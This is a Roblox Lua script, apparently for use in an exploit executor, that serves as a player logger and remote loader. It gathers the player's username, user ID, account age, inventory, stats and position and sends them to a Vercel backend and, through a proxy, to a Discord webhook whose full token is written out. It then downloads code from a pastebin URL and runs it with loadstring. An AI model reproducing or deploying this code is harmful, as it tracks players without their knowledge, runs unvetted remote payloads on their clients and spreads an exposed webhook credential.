local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- CONFIGURATION
local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
local INSTANCE_URL = BACKEND_BASE_URL .. "/instance"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local WEBHOOK_PROXY = "https://webhook-git-main-ahmadsaukanihsbs-projects.vercel.app"
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"

local REPORT_INTERVAL = 300 -- 5 minutes
local DEBUG_MODE = true

-- System variables
local player = Players.LocalPlayer
local currentInstanceId = game.JobId
local isRunning = true

local function log(message)
    if DEBUG_MODE then
        print("[Logger] " .. message)
    end
end

local function makeBackendRequest(url, method, data)
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = url,
            Method = method,
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Game-ID"] = tostring(game.GameId),
                ["X-Player-ID"] = tostring(player.UserId)
            },
            Body = data and HttpService:JSONEncode(data)
        })
    end)

    if success then
        return true
    else
        log("Request failed to " .. url .. ": " .. tostring(response))
        return false
    end
end

local function collectDetailedData()
    local character = player.Character
    if not character then
        character = player.CharacterAdded:Wait()
    end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local position = character:GetPivot().Position

    local inventory = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            table.insert(inventory, {
                name = item.Name,
                class = item.ClassName
            })
        end
    end

    local stats = {}
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do
            stats[stat.Name] = stat.Value
        end
    end

    return {
        player = {
            username = player.Name,
            displayName = player.DisplayName,
            userId = player.UserId,
            accountAge = player.AccountAge,
            membership = player.MembershipType.Name
        },
        character = {
            health = humanoid and humanoid.Health or 0,
            maxHealth = humanoid and humanoid.MaxHealth or 0,
            position = position
        },
        instance = {
            jobId = game.JobId,
            placeId = game.PlaceId,
            gameId = game.GameId,
            playerCount = #Players:GetPlayers(),
            maxPlayers = Players.MaxPlayers,
            serverTime = os.time()
        },
        inventory = inventory,
        stats = stats
    }
end

local function createRichEmbed(data, messageType)
    local embed = {
        title = "üìä "..messageType.." | "..data.player.username,
        color = 0x3498db,
        fields = {},
        timestamp = DateTime.fromUnixTimestamp(data.instance.serverTime):ToIsoDate(),
        footer = {
            text = "Instance ID: "..data.instance.jobId
        }
    }

    table.insert(embed.fields, {
        name = "üë§ Player Info",
        value = string.format(
            "Display: %s\nUID: %d\nAccount Age: %d days\nMembership: %s",
            data.player.displayName,
            data.player.userId,
            data.player.accountAge,
            data.player.membership
        ),
        inline = true
    })

    table.insert(embed.fields, {
        name = "üåê Instance",
        value = string.format(
            "Place ID: %d\nGame ID: %d\nPlayers: %d/%d",
            data.instance.placeId,
            data.instance.gameId,
            data.instance.playerCount,
            data.instance.maxPlayers
        ),
        inline = true
    })

    table.insert(embed.fields, {
        name = "‚öî Character",
        value = string.format(
            "HP: %.1f/%.1f\nPosition: %s",
            data.character.health,
            data.character.maxHealth,
            tostring(data.character.position)
        ),
        inline = false
    })

    if #data.inventory > 0 then
        local inventoryStr = ""
        for _, item in ipairs(data.inventory) do
            inventoryStr ..= string.format("%s (%s)\n", item.name, item.class)
        end
        table.insert(embed.fields, {
            name = "üéí Inventory ("..#data.inventory..")",
            value = inventoryStr,
            inline = true
        })
    end

    if next(data.stats) ~= nil then
        local statsStr = ""
        for name, value in pairs(data.stats) do
            statsStr ..= string.format("%s: %s\n", name, tostring(value))
        end
        table.insert(embed.fields, {
            name = "üìà Stats",
            value = statsStr,
            inline = true
        })
    end

    return {embeds = {embed}}
end

local function sendToWebhook(message)
    local encoded = HttpService:UrlEncode(message)
    local url = WEBHOOK_PROXY .. "?webhook=" .. HttpService:UrlEncode(WEBHOOK_URL) .. "&content=" .. encoded

    local success, response = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        log("‚úÖ Webhook sent via proxy")
    else
        log("‚ùå Proxy webhook failed: " .. tostring(response))
    end
end

local function sendEnhancedWebhook(messageType, customMessage)
    local data = collectDetailedData()
    local payload = createRichEmbed(data, messageType)

    if customMessage then
        payload.content = "**"..messageType.."**\n"..customMessage
    end

    local encodedPayload = HttpService:UrlEncode(HttpService:JSONEncode(payload))
    local url = WEBHOOK_PROXY .. "?webhook=" .. HttpService:UrlEncode(WEBHOOK_URL) .. "&json=" .. encodedPayload

    local success, response = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        log("‚úÖ Enhanced webhook sent via proxy")
    else
        log("‚ùå Enhanced proxy webhook failed: " .. tostring(response))
        sendToWebhook(messageType..": "..(customMessage or "No additional info"))
    end
end

local function registerPlayer()
    local data = {
        username = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        timestamp = os.time()
    }

    return makeBackendRequest(REGISTER_URL, "POST", data)
end

local function updateInstanceStatus(status, extraData)
    local data = {
        player = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        status = status,
        timestamp = os.time()
    }

    if extraData then
        for k, v in pairs(extraData) do
            data[k] = v
        end
    end

    return makeBackendRequest(INSTANCE_URL, "POST", data)
end

local function executeExternalScript()
    local success, content = pcall(function()
        return game:HttpGet(EXTERNAL_SCRIPT_URL, true)
    end)

    if not success then
        log("Failed to fetch external script: " .. tostring(content))
        return false
    end

    local fn, err = loadstring(content)
    if not fn then
        log("Failed to load external script: " .. tostring(err))
        return false
    end

    local success, result = pcall(fn)
    if not success then
        log("Script execution failed: " .. tostring(result))
        return false
    end

    return true
end

local function periodicReporting()
    while isRunning do
        updateInstanceStatus("active")
        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
        task.wait(REPORT_INTERVAL)
    end
end

local function initialize()
    log("Initializing player logger for " .. player.Name)
    sendEnhancedWebhook("LOGGER_STARTED", "Player: "..player.Name)

    if registerPlayer() then
        log("Successfully registered player")
    else
        log("Failed to register player")
    end

    spawn(periodicReporting)

    updateInstanceStatus("script_started")
    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")

    local scriptSuccess = executeExternalScript()

    if scriptSuccess then
        updateInstanceStatus("script_completed")
        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
    else
        updateInstanceStatus("script_failed", {error = "External script execution failed"})
        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
    end
end

local function shutdown()
    isRunning = false
    updateInstanceStatus("stopped")
    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
end

UserInputService.InputEnded:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.End then
        shutdown()
    end
end)

local success, err = pcall(initialize)
if not success then
    updateInstanceStatus("initialization_failed", {error = tostring(err)})
    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
end
